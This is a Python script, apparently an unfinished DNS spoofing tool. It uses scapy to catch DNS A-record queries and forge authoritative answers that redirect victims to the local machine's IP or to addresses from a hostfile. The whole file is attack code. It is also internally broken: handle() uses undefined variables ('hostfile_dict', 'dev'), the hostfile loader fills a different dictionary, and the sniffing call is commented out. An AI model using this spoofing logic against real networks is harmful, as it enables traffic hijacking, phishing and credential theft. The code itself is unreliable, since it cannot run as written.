import getopt
import sys
import os
import scapy.all as scapy
import netifaces as ni
global dns_ip
dns_ip = dict()

def handle(packet):
	global hostfile_dict
	
	# Only deal with packets containing DNS records
	if packet.haslayer(scapy.DNS):
		# Dissect packet into approriate layers
		orig_ip = packet.getlayer(scapy.IP)
		orig_udp = packet.getlayer(scapy.UDP)
		orig_dns = packet.getlayer(scapy.DNS)
		
		# If -h option provided
		if hostfile_dict:
			# Check if queried domain part of hostfile
			if (packet.getlayer(scapy.DNS).qd.qname) not in hostfile_dict.keys():
				return
			spoofed_rdata = hostfile_dict[orig_dns.qd.qname]
		else:
			# Spoofed IP of local machine
			ni.ifaddresses(dev)
			spoofed_rdata =  ni.ifaddresses(dev)[ni.AF_INET][0]['addr']
		
		#qr = 0 for Query and qtype = 1 for A record
		if orig_dns.qr == 0 and orig_dns.qd.qtype == 1: 
			spoofed_src_ip = orig_ip.dst
			spoofed_dst_ip = orig_ip.src
			spoofed_src_port = orig_udp.dport
			spoofed_dst_port = orig_udp.sport
			spoofed_id = orig_dns.id
			spoofed_qr = 1 
			spoofed_opcode = orig_dns.opcode
			spoofed_aa = 1
			spoofed_rd = orig_dns.rd
			spoofed_ra = 0
			spoofed_z = 0
			spoofed_rcode = 0
			spoofed_qdcount = 1
			spoofed_ancount = 1
			spoofed_question = scapy.DNSQR(qname = orig_dns.qd.qname, qtype = orig_dns.qd.qtype, qclass = orig_dns.qd.qclass)
			spoofed_answer = scapy.DNSRR(rrname = orig_dns.qd.qname, type = orig_dns.qd.qtype, rclass = orig_dns.qd.qclass, ttl = 40960, rdata = spoofed_rdata)   
			# To return multiple IPs
			#/scapy.DNSRR(rrname = orig_dns.qd.qname, type = orig_dns.qd.qtype, rclass = orig_dns.qd.qclass, ttl = 40960, rdata = spoofed_rdata)

			spoofed_IP = scapy.IP(src = spoofed_src_ip, dst = spoofed_dst_ip)
			spoofed_UDP = scapy.UDP(sport = spoofed_src_port, dport = spoofed_dst_port)
			spoofed_DNS = scapy.DNS(id = spoofed_id, qr = 1, opcode = spoofed_opcode, aa = 1, rd = spoofed_rd, ra = 0, z = 0, rcode = 0, qdcount = spoofed_qdcount, ancount = spoofed_ancount, qd = spoofed_question, an = spoofed_answer)
			# Sendp sends from layer 2
			scapy.sendp(scapy.Ether()/spoofed_IP/spoofed_UDP/spoofed_DNS, iface = dev 	)


def hf_lookup(hf):
    f = open(hf, 'r')
    for l in f:
        domain = l.split(",")[1].strip()
        ip = l.split(",")[0].strip()
        dns_ip[domain] = ip


def main():
    print(sys.argv)
    arg = sys.argv
    ndi = (arg[arg.index("-i")+1].strip() if "-i" in arg else ni.gateways()['default'][ni.AF_INET][1])
    hnf = (arg[arg.index("-h")+1].strip() if "-h" in arg else False)
    if hnf: hf_lookup(hnf)
    
        
    print(ndi)
    print(hnf)
    print(dns_ip)
    #scapy.sniff(iface=str(ndi), filter=str(hnf), prn=realsniffer)



if __name__ == "__main__":
    main()
